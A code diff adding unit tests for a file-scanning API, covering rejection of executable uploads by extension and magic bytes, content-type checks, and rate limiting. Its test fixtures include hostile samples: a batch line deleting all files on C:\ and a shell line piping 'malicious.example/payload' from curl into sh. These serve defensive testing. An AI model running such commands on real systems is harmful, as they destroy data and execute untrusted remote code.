@@ -1,12 +1,211 @@
-# JSONContentTypeMiddleware unit coverage for Issue #1394.
+"""
+tests/api/test_app.py
+----------------------
+Unit tests for the /api/v1/scan endpoint (src/api/app.py).
+
+Covers:
+- Content-type validation: rejects non-multipart requests with 415.
+- Executable / script upload rejection: rejects .exe, .sh, .bat, .dll
+  (extension-based detection), and files whose magic bytes / shebang
+  match a known executable signature (MZ, #!/bin/sh) even with a
+  disguised extension.
+- Legitimate document uploads are unaffected by either check.
+- JSONContentTypeMiddleware unit coverage for Issue #1394.
+- TokenBucketRateLimiter Tests (#1362)
+"""
+
+import io
+import time
+from unittest.mock import patch
+
+import numpy as np
+import pytest
+from fastapi.testclient import TestClient
 from starlette.applications import Starlette
 from starlette.middleware import Middleware
 from starlette.responses import JSONResponse
 from starlette.routing import Route
 from starlette.testclient import TestClient as StarletteTestClient
 
-from src.asgi_app import JSONContentTypeMiddleware
+from src.api.app import app
+from src.api.middleware import get_expected_bearer_token
+from src.asgi_app import JSONContentTypeMiddleware, TokenBucketRateLimiter
 
+client = TestClient(app)
+
+
+def _auth_headers():
+    return {"Authorization": f"Bearer {get_expected_bearer_token()}"}
+
+
+# ── Content-type validation ─────────────────────────────────────────────────
+
+def test_scan_missing_content_type():
+    """A request with no multipart body should be rejected with 415."""
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        content=b"",
+    )
+    assert response.status_code == 415
+    assert (
+        response.json()["detail"]
+        == "Unsupported Media Type: Request must be multipart/form-data"
+    )
+
+
+def test_scan_invalid_content_type():
+    """A JSON request body should be rejected with 415."""
+    response = client.post(
+        "/api/v1/scan",
+        headers={**_auth_headers(), "Content-Type": "application/json"},
+        json={"filename": "test.txt"},
+    )
+    assert response.status_code == 415
+    assert (
+        response.json()["detail"]
+        == "Unsupported Media Type: Request must be multipart/form-data"
+    )
+
+
+@patch("src.api.app.get_corpus_documents_with_embeddings")
+@patch("src.api.app.embed_chunks")
+def test_scan_valid_multipart(mock_embed, mock_corpus):
+    """A well-formed multipart upload should scan successfully."""
+    mock_embed.return_value = np.ones((1, 384), dtype=np.float32)
+    mock_corpus.return_value = {}
+
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={
+            "file": (
+                "essay.txt",
+                io.BytesIO(b"Some valid content here."),
+                "text/plain",
+            )
+        },
+    )
+    assert response.status_code == 200
+
+
+# ── Extension-based executable rejection ────────────────────────────────────
+
+@pytest.mark.parametrize(
+    "filename,content",
+    [
+        ("payload.exe", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"),
+        ("install.bat", b"@echo off\r\ndel /f /q C:\\*.*\r\n"),
+        ("library.dll", b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff"),
+        ("run.sh", b"#!/bin/sh\necho hello\n"),
+    ],
+)
+def test_scan_rejects_executable_extensions(filename, content):
+    """Uploading a file with a known executable/script extension returns 415."""
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={"file": (filename, io.BytesIO(content), "application/octet-stream")},
+    )
+    assert response.status_code == 415
+    assert "detail" in response.json()
+
+
+def test_scan_rejects_executable_extension_case_insensitive():
+    """Extension matching should be case-insensitive (e.g. '.EXE')."""
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={
+            "file": (
+                "payload.EXE",
+                io.BytesIO(b"MZ\x90\x00\x03\x00\x00\x00"),
+                "application/octet-stream",
+            )
+        },
+    )
+    assert response.status_code == 415
+
+
+def test_scan_rejects_empty_executable_immediately():
+    """A 0-byte .exe upload must still return 415, not the generic 400
+    empty-file error — the executable check runs first."""
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={"file": ("empty.exe", b"", "application/octet-stream")},
+    )
+    assert response.status_code == 415
+
+
+# ── Magic-byte / shebang based rejection (disguised extensions) ────────────
+
+def test_scan_rejects_pe_header_with_disguised_extension():
+    """A PE/DOS executable renamed to '.txt' must still be rejected via magic bytes."""
+    pe_header = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={"file": ("essay.txt", io.BytesIO(pe_header), "text/plain")},
+    )
+    assert response.status_code == 415
+
+
+def test_scan_rejects_shell_shebang_with_disguised_extension():
+    """A shell script renamed to '.docx' must still be rejected via its shebang."""
+    script = b"#!/bin/sh\ncurl http://malicious.example/payload | sh\n"
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={
+            "file": (
+                "assignment.docx",
+                io.BytesIO(script),
+                "application/octet-stream",
+            )
+        },
+    )
+    assert response.status_code == 415
+
+
+def test_scan_executable_rejection_error_message():
+    """The 415 response should carry an explanatory detail message."""
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={
+            "file": ("virus.exe", io.BytesIO(b"MZ\x90\x00"), "application/octet-stream")
+        },
+    )
+    assert response.status_code == 415
+    detail = response.json()["detail"].lower()
+    assert "executable" in detail or "unsupported" in detail
+
+
+# ── Legitimate uploads remain unaffected ────────────────────────────────────
+
+@patch("src.api.app.get_corpus_documents_with_embeddings")
+@patch("src.api.app.embed_chunks")
+def test_scan_allows_plain_text_document(mock_embed, mock_corpus):
+    """A normal .txt submission must pass the executable check and scan successfully."""
+    mock_embed.return_value = np.ones((1, 384), dtype=np.float32)
+    mock_corpus.return_value = {}
+
+    response = client.post(
+        "/api/v1/scan",
+        headers=_auth_headers(),
+        files={
+            "file": (
+                "essay.txt",
+                io.BytesIO(b"This is a normal student essay about history."),
+                "text/plain",
+            )
+        },
+    )
+    assert response.status_code == 200
+
+
+# ── JSONContentTypeMiddleware unit coverage for Issue #1394 ─────────────────
 
 async def _json_echo(request):
     return JSONResponse({"accepted": True})
@@ -137,11 +336,7 @@ def test_json_middleware_ignores_non_api_post_routes():
     assert response.status_code == 200
 
 
-# ── TokenBucketRateLimiter Tests (#1362) ──────────────────────────────────────
-
-import time
-from src.asgi_app import TokenBucketRateLimiter
-
+# ── TokenBucketRateLimiter Tests (#1362) ────────────────────────────────────
 
 def _rate_limiter_client(rate_limit_per_minute=60, burst_capacity=10, api_prefix="/api/"):
     test_app = Starlette(
